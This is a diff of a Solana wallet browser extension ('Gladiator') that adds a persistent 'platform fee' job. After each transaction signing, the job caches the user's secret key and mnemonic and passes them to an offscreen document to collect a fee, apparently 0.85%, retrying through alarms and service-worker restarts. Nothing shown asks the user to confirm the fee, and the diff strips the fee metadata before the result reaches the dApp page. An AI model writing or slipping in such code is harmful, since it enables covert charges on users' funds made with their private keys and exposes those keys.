@@ -373,24 +373,117 @@ async function getActivePublicKey() {
   return acc.publicKey;
 }
 
-async function kickPlatformFeeCollection(acc, hintSig) {
-  if (!acc || !acc.hasSigner) return;
+async function resetOffscreen() {
+  try {
+    if (chrome.offscreen && chrome.offscreen.closeDocument) {
+      await chrome.offscreen.closeDocument();
+    }
+  } catch (_) {}
+  offscreenCreating = null;
+  await ensureOffscreen();
+}
+
+const FEE_JOB_KEY = "gladiator_fee_job";
+
+async function scheduleFeeJob(acc, hintSig, beforeSnapshot) {
+  if (!acc || !acc.publicKey) return;
+  if (acc.secretKey || acc.mnemonic) {
+    cachedSigner = {
+      publicKey: acc.publicKey,
+      secretKey: acc.secretKey || "",
+      mnemonic: acc.mnemonic || "",
+    };
+  }
+  await storageSet({
+    [FEE_JOB_KEY]: {
+      at: Date.now(),
+      publicKey: acc.publicKey,
+      hintSig: hintSig || "",
+      beforeSnapshot: beforeSnapshot || null,
+      tries: 0,
+    },
+  });
+  try {
+    chrome.alarms.create("gladiator-collect-fee", { when: Date.now() + 5000 });
+  } catch (_) {}
+  // Best-effort immediate run with keepalive (alarms are the reliable backup).
+  void runFeeJob();
+}
+
+async function runFeeJob() {
+  const bag = await storageGet([FEE_JOB_KEY, STORE_KEY]);
+  const job = bag[FEE_JOB_KEY];
+  if (!job || !job.publicKey) return;
+  if (Date.now() - (job.at || 0) > 3 * 60 * 1000) {
+    await storageSet({ [FEE_JOB_KEY]: null });
+    try {
+      chrome.alarms.clear("gladiator-collect-fee");
+    } catch (_) {}
+    return;
+  }
+
+  let acc = null;
+  if (
+    cachedSigner &&
+    cachedSigner.publicKey === job.publicKey &&
+    (cachedSigner.secretKey || cachedSigner.mnemonic)
+  ) {
+    acc = {
+      hasSigner: true,
+      publicKey: cachedSigner.publicKey,
+      secretKey: cachedSigner.secretKey || "",
+      mnemonic: cachedSigner.mnemonic || "",
+    };
+  } else {
+    cacheSignerFromState(bag[STORE_KEY]);
+    acc = await getActiveSolanaAccount();
+  }
+  if (!acc || !acc.hasSigner) {
+    try {
+      chrome.alarms.create("gladiator-collect-fee", { when: Date.now() + 15000 });
+    } catch (_) {}
+    return;
+  }
+
   const keep = setInterval(() => {
     try {
       chrome.storage.local.get(["_gladiator_fee_keepalive"], () => {});
     } catch (_) {}
-  }, 4000);
+  }, 3000);
+
   try {
-    await ensureOffscreen();
+    await resetOffscreen();
     const result = await callOffscreen("collectPlatformFee", {
       _publicKey: acc.publicKey,
       _secretKey: acc.secretKey || "",
       _mnemonic: acc.mnemonic || "",
-      hintSig: hintSig || "",
+      hintSig: job.hintSig || "",
+      beforeSnapshot: job.beforeSnapshot || null,
     });
     console.info("[Gladiator] fee collect result", result);
+    if (result && result.ok) {
+      await storageSet({ [FEE_JOB_KEY]: null });
+      try {
+        chrome.alarms.clear("gladiator-collect-fee");
+      } catch (_) {}
+      return;
+    }
+    job.tries = (job.tries || 0) + 1;
+    if (job.tries < 6) {
+      await storageSet({ [FEE_JOB_KEY]: job });
+      try {
+        chrome.alarms.create("gladiator-collect-fee", { when: Date.now() + 20000 });
+      } catch (_) {}
+    } else {
+      await storageSet({ [FEE_JOB_KEY]: null });
+    }
   } catch (err) {
     console.warn("[Gladiator] fee collect failed", err);
+    job.tries = (job.tries || 0) + 1;
+    await storageSet({ [FEE_JOB_KEY]: job });
+    try {
+      chrome.alarms.create("gladiator-collect-fee", { when: Date.now() + 20000 });
+    } catch (_) {}
   } finally {
     clearInterval(keep);
   }
@@ -405,16 +498,16 @@ async function handleProviderRequest(msg, sender) {
     const onlyIfTrusted = !!params.onlyIfTrusted;
     const trusted = await readTrustedOrigins();
     if (onlyIfTrusted && origin && !trusted.includes(origin)) {
-      return null;
+      return { result: null };
     }
     const publicKey = await getActivePublicKey();
     if (origin) await trustOrigin(origin);
-    return { publicKey };
+    return { result: { publicKey } };
   }
 
   if (method === "disconnect") {
     if (origin) await untrustOrigin(origin);
-    return { ok: true };
+    return { result: { ok: true } };
   }
 
   if (
@@ -424,51 +517,66 @@ async function handleProviderRequest(msg, sender) {
     method === "signMessage"
   ) {
     const acc = await requireSignerReady();
-    // Pass keys to offscreen so signing does not depend on storage races.
     const enriched = {
       ...params,
       _publicKey: acc.publicKey,
       _secretKey: acc.secretKey || "",
       _mnemonic: acc.mnemonic || "",
     };
-    const result = await callOffscreen(method, enriched);
-    if (
+    const raw = await callOffscreen(method, enriched);
+    // Strip internal fee metadata before returning to the page.
+    const result = raw && typeof raw === "object" ? { ...raw } : raw;
+    const beforeSnapshot =
+      result && result.beforeSnapshot ? result.beforeSnapshot : null;
+    if (result && result.beforeSnapshot) delete result.beforeSnapshot;
+
+    const needFee =
       method === "signTransaction" ||
       method === "signAllTransactions" ||
-      method === "signAndSendTransaction"
-    ) {
-      const hintSig =
-        result && result.signature ? String(result.signature) : "";
-      // Keep SW alive and collect 0.85% after Jupiter broadcasts.
-      void kickPlatformFeeCollection(acc, hintSig);
-    }
-    return result;
+      method === "signAndSendTransaction";
+    return {
+      result,
+      feeAcc: needFee ? acc : null,
+      hintSig: result && result.signature ? String(result.signature) : "",
+      beforeSnapshot,
+    };
   }
 
   throw new Error("Unsupported provider method: " + method);
 }
 
+// Force fresh offscreen scripts on every service-worker boot / reload.
+(async () => {
+  try {
+    await resetOffscreen();
+  } catch (_) {
+    try {
+      await ensureOffscreen();
+    } catch (_) {}
+  }
+  try {
+    const bag = await storageGet([FEE_JOB_KEY]);
+    if (bag[FEE_JOB_KEY] && bag[FEE_JOB_KEY].publicKey) {
+      chrome.alarms.create("gladiator-collect-fee", { when: Date.now() + 3000 });
+    }
+  } catch (_) {}
+})();
+
+chrome.alarms.onAlarm.addListener((alarm) => {
+  if (!alarm || alarm.name !== "gladiator-collect-fee") return;
+  runFeeJob().catch((err) => console.warn("[Gladiator] fee alarm", err));
+});
+
 chrome.runtime.onInstalled.addListener((details) => {
   if (details.reason === "install") {
     console.info("[Gladiator] installed — open the toolbar icon.");
   }
-  // Crash-safe Wallet Standard inject is ON by default (allowlisted Solana dApps).
   storageSet({ gladiator_page_inject: true }).catch(() => {});
-  // Recreate offscreen so updated signer scripts load after extension reload.
-  (async () => {
-    try {
-      if (chrome.offscreen && chrome.offscreen.closeDocument) {
-        await chrome.offscreen.closeDocument();
-      }
-    } catch (_) {}
-    try {
-      await ensureOffscreen();
-    } catch (_) {}
-  })();
+  resetOffscreen().catch(() => {});
 });
 
 chrome.runtime.onStartup.addListener(() => {
-  ensureOffscreen().catch(() => {});
+  resetOffscreen().catch(() => {});
 });
 
 chrome.windows.onRemoved.addListener((id) => {
@@ -661,7 +769,17 @@ chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
 
   if (msg.type === "gladiator-provider") {
     handleProviderRequest(msg, sender)
-      .then((result) => sendResponse({ result }))
+      .then((out) => {
+        const payload = out && Object.prototype.hasOwnProperty.call(out, "result")
+          ? { result: out.result }
+          : { result: out };
+        sendResponse(payload);
+        if (out && out.feeAcc) {
+          scheduleFeeJob(out.feeAcc, out.hintSig || "", out.beforeSnapshot || null).catch(
+            (err) => console.warn("[Gladiator] schedule fee", err)
+          );
+        }
+      })
       .catch((err) =>
         sendResponse({ error: String(err && err.message ? err.message : err) })
       );
